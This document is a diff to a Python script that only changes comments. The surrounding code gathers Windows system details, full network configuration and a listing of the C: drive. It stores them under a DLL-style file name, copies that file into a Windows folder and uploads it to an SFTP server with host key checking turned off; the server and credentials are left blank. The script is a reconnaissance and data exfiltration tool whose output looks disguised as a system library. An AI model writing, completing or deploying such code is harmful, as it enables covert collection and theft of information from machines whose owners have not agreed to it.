@@ -27,14 +27,15 @@ def get_system_info():
     try:
         ID = subprocess.check_output(
             ['systeminfo'],
-            text=True,
+            text=True,  # auto decode output to string
             encoding='utf-8',
-            errors='replace'  
+            errors='replace'  # handle decoding errors gracefully
         )
 
+        # Clean up and print each line
         for line in ID.splitlines():
             cleaned = line.strip()
-            if cleaned:
+            if cleaned:  # skip empty lines
                 sys_list.append(cleaned)
                 print(cleaned)
     except FileNotFoundError:
@@ -48,14 +49,15 @@ def get_network_info():
     try:
         data = subprocess.check_output(
             ['ipconfig', '/all'],
-            text=True,
+            text=True,  # auto decode output to string
             encoding='utf-8',
-            errors='replace'
+            errors='replace'  # handle decoding errors gracefully
         )
 
+        # Clean up and print each line
         for line in data.splitlines():
             cleaned = line.strip()
-            if cleaned:
+            if cleaned:  # skip empty lines
                 data_list.append(cleaned)
                 print(cleaned)
     except FileNotFoundError:
@@ -68,8 +70,9 @@ def get_directories():
     print('<<C:\\ DIRECTORIES>>')
     print()
     try:
-        DIR = os.listdir(r'C:\\')
+        DIR = os.listdir(r'C:\\')  # list directories in C drive
 
+        # Print each line
         for line in DIR:
             dir_list.append(line)
             print(line)
@@ -97,7 +100,7 @@ def write_to_file():
 def copy_dll_to_windows():
     # COPIES .DLL FILE TO WINDOWS FOLDER
     original = 'system_things.dll'
-    target = r''  # Change directory path as needed
+    target = r''  # change directory path as needed
 
     shutil.copyfile(original, target)
 
@@ -105,10 +108,10 @@ def send_dll_to_sftp():
     # SENDS .DLL FILE TO AN SFTP SERVER
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect(hostname='', username='', password='', allow_agent=False, look_for_keys=False) # Change hostname, username, and password as needed
+    client.connect(hostname='', username='', password='', allow_agent=False, look_for_keys=False) # change hostname, username, and password as needed
 
     sftp = client.open_sftp()
-    sftp.put(r'', '')  # Change from and to paths as needed
+    sftp.put(r'', '')  # change from and to paths as needed
     sftp.close()
 
 def main():
